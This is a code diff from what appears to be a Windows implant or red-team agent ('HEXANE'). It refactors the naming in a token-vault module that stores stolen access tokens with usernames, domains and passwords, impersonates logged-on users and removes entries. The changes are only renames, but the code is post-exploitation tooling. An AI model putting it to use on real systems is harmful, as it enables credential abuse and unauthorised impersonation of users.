@@ -16,19 +16,19 @@ namespace Token {
 		HEXANE
 
 		BOOL success = FALSE;
-		if (impersonate && !Ctx->Tokens.Impersonate && Ctx->Tokens.Token) {
-			if (!(Ctx->Tokens.Impersonate = Ctx->win32.ImpersonateLoggedOnUser(Ctx->Tokens.Token->Handle))) {
+		if (impersonate && !Ctx->tokens.impersonate && Ctx->tokens.token) {
+			if (!(Ctx->tokens.impersonate = Ctx->win32.ImpersonateLoggedOnUser(Ctx->tokens.token->handle))) {
 				return_defer(ERROR_CANNOT_IMPERSONATE);
 			}
-		} else if (!impersonate && Ctx->Tokens.Impersonate) {
-			Ctx->Tokens.Impersonate = FALSE;
+		} else if (!impersonate && Ctx->tokens.impersonate) {
+			Ctx->tokens.impersonate = FALSE;
 			success = RevertToken();
 
-		} else if (impersonate && !Ctx->Tokens.Token) {
+		} else if (impersonate && !Ctx->tokens.token) {
 			success = TRUE;
-		} else if (impersonate && Ctx->Tokens.Impersonate) {
+		} else if (impersonate && Ctx->tokens.impersonate) {
 			success = TRUE;
-		} else if (impersonate && !Ctx->Tokens.Impersonate) {
+		} else if (impersonate && !Ctx->tokens.impersonate) {
 			success = TRUE;
 		}
 
@@ -111,7 +111,7 @@ namespace Token {
 	_token_list_data* GetToken(const uint32_t tokenId) {
 		HEXANE
 
-		_token_list_data *head = Ctx->Tokens.Vault;
+		_token_list_data *head = Ctx->tokens.vault;
 		uint32_t index = 0;
 
 		for ( ;index < tokenId && head && head->Next; ++index) {
@@ -133,21 +133,21 @@ namespace Token {
 
 		entry = R_CAST(_token_list_data*, x_malloc(sizeof(_token_list_data)));
 
-		entry->Handle		= token;
-		entry->lpUser		= username;
-		entry->dwProcessID	= pid;
-		entry->Type			= type;
-		entry->DomainUser	= domain_user;
-		entry->lpDomain		= domain;
-		entry->lpPassword	= password;
+		entry->handle		= token;
+		entry->username		= username;
+		entry->pid			= pid;
+		entry->type			= type;
+		entry->domain_user	= domain_user;
+		entry->domain		= domain;
+		entry->password		= password;
 		entry->Next			= nullptr;
 
-		if (Ctx->Tokens.Vault == nullptr) {
-			Ctx->Tokens.Vault = entry;
+		if (Ctx->tokens.vault == nullptr) {
+			Ctx->tokens.vault = entry;
 			return Index;
 		}
 
-		head = Ctx->Tokens.Vault;
+		head = Ctx->tokens.vault;
 		while (head->Next) {
 			head = head->Next;
 			Index++;
@@ -162,7 +162,7 @@ namespace Token {
 	BOOL RemoveToken(const uint32_t token_id) {
 		HEXANE
 
-		_token_list_data *head	= Ctx->Tokens.Vault;
+		_token_list_data *head	= Ctx->tokens.vault;
 		_token_list_data *entry	= GetToken(token_id);
 		_token_list_data *prev	= { };
 
@@ -172,11 +172,11 @@ namespace Token {
 
 		while (head) {
 			if (head == entry) {
-				if (head == Ctx->Tokens.Vault) {
-					Ctx->Tokens.Vault = entry->Next;
+				if (head == Ctx->tokens.vault) {
+					Ctx->tokens.vault = entry->Next;
 
 				} else {
-					prev = Ctx->Tokens.Vault;
+					prev = Ctx->tokens.vault;
 					while (prev && prev->Next != entry) {
 						prev = prev->Next;
 					}
@@ -185,37 +185,37 @@ namespace Token {
 					}
 				}
 
-				if (Ctx->Tokens.Impersonate && Ctx->Tokens.Token->Handle == entry->Handle) {
+				if (Ctx->tokens.impersonate && Ctx->tokens.token->handle == entry->handle) {
 					TokenImpersonate(FALSE);
 				}
 
-				if (entry->Handle) {
-					Ctx->Nt.NtClose(entry->Handle);
-					entry->Handle = nullptr;
+				if (entry->handle) {
+					Ctx->Nt.NtClose(entry->handle);
+					entry->handle = nullptr;
 				}
 
-				if (entry->DomainUser) {
-					x_memset(entry->DomainUser, 0, x_wcslen(entry->DomainUser) * sizeof(wchar_t));
-					x_free(entry->DomainUser);
-					entry->DomainUser = nullptr;
+				if (entry->domain_user) {
+					x_memset(entry->domain_user, 0, x_wcslen(entry->domain_user) * sizeof(wchar_t));
+					x_free(entry->domain_user);
+					entry->domain_user = nullptr;
 				}
 
-				if (entry->lpUser) {
-					x_memset(entry->lpUser, 0, x_wcslen(entry->lpUser) * sizeof(wchar_t));
-					x_free(entry->lpUser);
-					entry->lpUser = nullptr;
+				if (entry->username) {
+					x_memset(entry->username, 0, x_wcslen(entry->username) * sizeof(wchar_t));
+					x_free(entry->username);
+					entry->username = nullptr;
 				}
 
-				if (entry->lpDomain) {
-					x_memset(entry->lpDomain, 0, x_wcslen(entry->lpDomain) * sizeof(wchar_t));
-					x_free(entry->lpDomain);
-					entry->lpDomain = nullptr;
+				if (entry->domain) {
+					x_memset(entry->domain, 0, x_wcslen(entry->domain) * sizeof(wchar_t));
+					x_free(entry->domain);
+					entry->domain = nullptr;
 				}
 
-				if (entry->lpPassword) {
-					x_memset(entry->lpPassword, 0, x_wcslen(entry->lpPassword) * sizeof(wchar_t));
-					x_free(entry->lpPassword);
-					entry->lpPassword = nullptr;
+				if (entry->password) {
+					x_memset(entry->password, 0, x_wcslen(entry->password) * sizeof(wchar_t));
+					x_free(entry->password);
+					entry->password = nullptr;
 				}
 
 				x_memset(entry, 0, sizeof(_token_list_data));
